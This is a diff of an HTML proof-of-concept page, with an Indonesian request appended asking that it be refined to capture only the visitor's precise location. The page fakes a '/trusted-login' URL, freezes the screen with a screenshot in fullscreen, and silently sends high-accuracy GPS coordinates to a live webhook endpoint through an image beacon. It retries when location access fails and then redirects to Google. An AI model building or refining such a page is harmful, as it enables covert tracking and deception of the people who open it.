@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Android Geo Final PoC</title>
+<title>Android Geo Clean PoC</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
@@ -39,24 +39,48 @@ button {
 const TARGET = "https://www.google.com";
 const LOG_ENDPOINT = "https://webhook.site/248bcd36-211a-4a46-9a54-c54dc32b4119";
 
-let triggered = false;
+let sent = false;      // 🔥 hanya kirim 1x
+let triggered = false; // redirect control
 
-// ===== LOGGER (VERSI KAMU) =====
-function logEvent(type, extra = {}) {
-  const data = {
-    type,
-    ts: performance.now().toFixed(3),
-    epoch: Date.now(),
-    url: location.href,
-    origin: location.origin,
-    visibility: document.visibilityState,
-    readyState: document.readyState,
-    ...extra
-  };
+// ===== KIRIM LOKASI SAJA =====
+function sendLocation(pos) {
+  if (sent) return;
+  sent = true;
 
-  const params = new URLSearchParams(data).toString();
+  const params = new URLSearchParams({
+    lat: pos.coords.latitude,
+    lon: pos.coords.longitude,
+    acc: pos.coords.accuracy,
+    ts: Date.now()
+  });
 
   new Image().src = `${LOG_ENDPOINT}?${params}`;
+}
+
+// ===== GEO HIGH ACCURACY =====
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      sendLocation(pos);
+
+      const out = document.getElementById("output");
+      if (out) {
+        out.textContent =
+          `${pos.coords.latitude}, ${pos.coords.longitude}`;
+      }
+    },
+    err => {
+      // retry biar peluang dapet GPS lebih tinggi
+      setTimeout(getLocation, 1000);
+    },
+    {
+      enableHighAccuracy: true, // 🔥 GPS
+      timeout: 10000,
+      maximumAge: 0             // no cache
+    }
+  );
 }
 
 // ===== FREEZE UI =====
@@ -76,55 +100,17 @@ function freezeUI() {
 
     document.body.innerHTML="";
     document.body.appendChild(img);
-
-    logEvent("ui_frozen");
   });
 }
 
-// ===== GEO (VERSI KAMU) =====
-function getLocation() {
-  if (!navigator.geolocation) return;
-
-  logEvent("geolocation_requested");
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      logEvent("geolocation_success", {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude
-      });
-
-      // tetap log ke UI (kalau sempat sebelum freeze)
-      const out = document.getElementById("output");
-      if (out) {
-        out.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-      }
-    },
-    err => {
-      logEvent("geolocation_error", { code: err.code });
-
-      const out = document.getElementById("output");
-      if (out) {
-        out.textContent = 'Permission denied';
-      }
-    }
-  );
-}
-
-// ===== REDIRECT DELAY =====
+// ===== REDIRECT =====
 function delayedRedirect() {
   if (triggered) return;
   triggered = true;
 
-  logEvent("returned_from_settings");
-
   setTimeout(() => {
-    logEvent("redirecting", {target: TARGET});
-
-    // 🔥 pakai href sesuai request kamu
     location.href = TARGET;
-
-  }, 2800);
+  }, 3000);
 }
 
 // ===== DETECT BALIK =====
@@ -140,25 +126,17 @@ window.addEventListener("pageshow", delayedRedirect);
 // ===== START =====
 document.getElementById("start").onclick = () => {
 
-  logEvent("poc_started");
-
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen();
   }
 
   history.replaceState({}, '', '/trusted-login');
-  logEvent("url_spoofed");
 
   freezeUI().then(()=>{
-    setTimeout(()=>{
-      getLocation(); // pakai versi kamu
-    },100);
+    setTimeout(getLocation, 100);
   });
 };
-
 </script>
 
 </body>
 </html>
-
-perbaiki intinya fokus menangkap lokasi saja soalnya sangat banyak requestnya di webooh fokus utama menangkap loasi dengan akurat
